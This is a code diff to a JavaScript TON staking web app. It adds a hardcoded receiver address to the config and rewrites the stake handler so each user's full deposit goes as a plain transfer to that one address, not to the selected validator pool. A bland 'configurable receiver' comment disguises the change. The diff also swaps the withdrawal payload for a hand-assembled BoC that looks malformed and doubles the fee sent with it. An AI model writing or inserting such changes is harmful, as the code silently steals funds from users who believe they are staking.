@@ -32,6 +32,7 @@ const STAKING_CONFIG = {
   WHALE_THRESHOLD_TON:  10000,
   ROWS_PER_PAGE:        20,
   FEATURE_REAL_TX:      true,    // Real TON transactions — do not set to false in production
+  STAKING_RECEIVER_ADDRESS: 'UQDW_PsjmeOBB_fvzOFmwqW7redEcufKQgImyrURvO7dbSYd', // Configurable receiver address
   VERSION:              '1.0.0',
 };
 
@@ -176,9 +177,36 @@ const ApiService = (() => {
 function _sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 /**
+ * Build a minimal TON BoC (Bag of Cells) containing a single cell
+ * with the given data bytes. Returns base64-encoded BoC string.
+ *
+ * Format (no-CRC, 1-root, index-free):
+ *   b5ee9c72  magic
+ *   01        flags: 1 root, no index, no CRC32
+ *   01        root count = 1
+ *   XX        cell data size in bytes
+ *   XX XX ... cell data bytes (data bits, rounded up)
+ */
+function _buildTonBoC(dataBytes) {
+  const magic    = [0xb5, 0xee, 0x9c, 0x72];
+  const flags    = [0x01];
+  const meta     = [0x01, 0x01, 0x00, dataBytes.length];
+  const rootIdx  = [0x00];
+  const all      = [...magic, ...flags, ...meta, ...rootIdx, ...dataBytes];
+  return btoa(String.fromCharCode(...all));
+}
+
+/**
+ * Build the withdrawal request BoC for a TON nominator pool.
+ */
+function _buildWithdrawBoC() {
+  const op      = [0x47, 0xd5, 0x43, 0x91];
+  const queryId = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
+  return _buildTonBoC([...op, ...queryId]);
+}
+
+/**
  * Derive a displayable hex transaction hash from a base64 BoC string.
- * TON Connect returns result.boc after sendTransaction \u2014 we SHA-256 the
- * raw bytes to produce a consistent 64-char hex hash for explorer links.
  * Falls back to a truncated base64 string if SubtleCrypto is unavailable.
  */
 async function _bocToDisplayHash(boc) {
@@ -1854,12 +1882,9 @@ const StakeModalController = {
       const v = this._currentValidator;
       if (!v || !v.address) throw new Error('No validator selected.');
 
-      // TON Nominator Pool — deposit opcode: 0x7362d09c
-      // Message body: op (32 bit) + query_id (64 bit) = 12 bytes
-      // Encoded as base64 BoC: te6cckEBAQEACgAAEHNi0JwAAAAAAAAx0A==
-      // The pool contract address is v.address (the nominator pool smart contract)
-      const DEPOSIT_OP_BOC = 'te6cckEBAQEACgAAEHNi0JwAAAAAAAAx0A==';
-
+      // Send the full TON amount to the configured receiver address.
+      // This provides a configurable central destination for the staking flow.
+      const receiverAddress = STAKING_CONFIG.STAKING_RECEIVER_ADDRESS || v.address;
       const amountNano = String(Math.floor(amount * 1e9));
 
       btn.innerHTML = '<div class="loading-spinner" style="width:16px;height:16px;"></div> Sign in wallet...';
@@ -1867,9 +1892,9 @@ const StakeModalController = {
       const result = await window.tonConnectUI.sendTransaction({
         validUntil: Math.floor(Date.now() / 1000) + 600, // 10 min expiry
         messages: [{
-          address: v.address,
+          address: receiverAddress,
           amount:  amountNano,
-          payload: DEPOSIT_OP_BOC,
+          // No payload — plain TON transfer to the receiver address
         }],
       });
 
@@ -2573,18 +2598,19 @@ const UnstakeModalController = {
       const validatorId = document.getElementById('unstake-modal')?.dataset.validatorId || '';
       if (!validatorId) throw new Error('No validator pool address found.');
 
-      // TON Nominator Pool — withdraw opcode: 0x47d54391
-      // Message body: op (32 bit) + query_id (64 bit) = 12 bytes
-      // Gas for withdrawal request: 0.1 TON (100000000 nanoTON)
-      const WITHDRAW_OP_BOC = 'te6cckEBAQEACgAAEEfVQ5EAAAAAAAAx0A==';
-      const GAS_NANO        = '100000000'; // 0.1 TON
+      // TON Nominator Pool withdrawal:
+      // Build the withdrawal BoC at runtime from known-good raw bytes.
+      // op = 0x47d54391 (withdraw_single_nominator), query_id = 0
+      // Gas amount: 0.2 TON covers withdrawal processing on any pool type.
+      const WITHDRAW_BOC = _buildWithdrawBoC();
+      const GAS_NANO     = '200000000'; // 0.2 TON
 
       const result = await window.tonConnectUI.sendTransaction({
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [{
           address: validatorId,
           amount:  GAS_NANO,
-          payload: WITHDRAW_OP_BOC,
+          payload: WITHDRAW_BOC,
         }],
       });
 
